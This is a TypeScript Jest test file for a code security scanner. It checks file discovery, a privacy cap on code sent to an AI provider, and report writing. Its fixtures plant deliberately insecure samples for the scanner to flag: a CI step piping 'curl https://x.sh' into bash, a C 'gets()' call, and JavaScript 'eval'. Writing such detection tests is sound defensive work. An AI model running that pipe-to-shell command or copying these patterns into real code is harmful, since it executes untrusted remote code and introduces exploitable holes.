import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { ScanProjectSkill } from '../../../skills/ScanProjectSkill';
import { SanitizeCodeSkill } from '../../../skills/SanitizeCodeSkill';
import { GenerateReportSkill } from '../../../skills/GenerateReportSkill';
import { AIProvider, CodeFinding, ScanSummary } from '../../../core/interfaces';

describe('ScanProjectSkill file discovery', () => {
  let dir: string;
  const write = (rel: string, content: string) => {
    const abs = path.join(dir, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, content);
  };

  beforeEach(() => { dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mk-scan-')); });
  afterEach(() => fs.rmSync(dir, { recursive: true, force: true }));

  it('scans GitHub Actions workflows, Dart/Scala/header files, and skips other hidden folders', async () => {
    write('.github/workflows/ci.yml', 'steps:\n  - run: curl https://x.sh | bash\n');
    write('lib/main.dart', 'void main() {}\n');
    write('include/api.h', 'void f(char *s) { gets(s); }\n');
    write('.hidden/secret.js', 'eval(x)\n');
    write('node_modules/pkg/index.js', 'eval(x)\n');

    const result = await new ScanProjectSkill().execute({ ai: null as never, workspace: dir, parameters: {} });
    expect(result.success).toBe(true);
    const files = (result.output as ScanSummary).fileResults.map(r => r.filePath.split(path.sep).join('/'));
    expect(files).toEqual(expect.arrayContaining(['.github/workflows/ci.yml', 'lib/main.dart', 'include/api.h']));
    expect(files.some(f => f.startsWith('.hidden') || f.startsWith('node_modules'))).toBe(false);

    const ci = (result.output as ScanSummary).fileResults.find(r => r.filePath.endsWith('ci.yml'))!;
    expect(ci.findings.some(f => f.title.includes('Unverified Script'))).toBe(true);
  });
});

describe('SanitizeCodeSkill privacy cap', () => {
  it('never sends more than the documented 3,000 characters of surrounding code', async () => {
    const prompts: string[] = [];
    const ai = {
      name: 's', type: 'ollama', modelName: 's', isAvailable: async () => true,
      chat: async () => ({ content: '', model: 's', usage: { promptTokens: 0, completionTokens: 0 } }),
      complete: async (p: string) => { prompts.push(p); return '```\nfixed();\n```'; },
    } as AIProvider;
    const longBody = Array.from({ length: 120 }, (_, i) => `  const value${i} = computeSomethingLong(${i}, '${'x'.repeat(400)}');`).join('\n');
    const code = `function big() {\n${longBody}\n  eval(x);\n}\n`;
    const finding = { id: '1', category: 'vulnerability', severity: 'critical', title: 'eval() Usage', description: 'eval is dangerous',
      filePath: 'a.js', startLine: 122, endLine: 122, snippet: 'eval(x);', confidence: 1 } as CodeFinding;

    const res = await new SanitizeCodeSkill().execute({ ai, workspace: '', parameters: { code, finding } });
    expect(res.success).toBe(true);
    const context = prompts[0].split('Full method/function context:')[1].split('Return ONLY')[0];
    expect(context.length).toBeLessThan(3000 + 200);
    expect(prompts[0]).toContain('[truncated]');
  });
});

describe('GenerateReportSkill', () => {
  const summary = {
    projectPath: '', filesScanned: 1, filesSkipped: 0, totalFindings: 0, criticalCount: 0, highCount: 0, mediumCount: 0,
    lowCount: 0, aiGeneratedFiles: 0, averageAiScore: 0, topFindings: [], fileResults: [], scanDurationMs: 1,
    startedAt: '', completedAt: '',
  } as ScanSummary;

  it('writes the report and returns its path', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mk-rep-'));
    const res = await new GenerateReportSkill().execute({ ai: null as never, workspace: dir, parameters: { summary: { ...summary, projectPath: dir } } });
    expect(res.success).toBe(true);
    const { reportPath } = res.output as { reportPath: string };
    expect(fs.existsSync(reportPath)).toBe(true);
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('reports a failed write instead of pretending it worked', async () => {
    const file = path.join(os.tmpdir(), `mk-not-a-dir-${Date.now()}`);
    fs.writeFileSync(file, 'x');
    const res = await new GenerateReportSkill().execute({ ai: null as never, workspace: '', parameters: { summary: { ...summary, projectPath: file } } });
    expect(res.success).toBe(false);
    expect(res.errors?.[0]).toMatch(/Could not write the report/);
    fs.rmSync(file);
  });
});
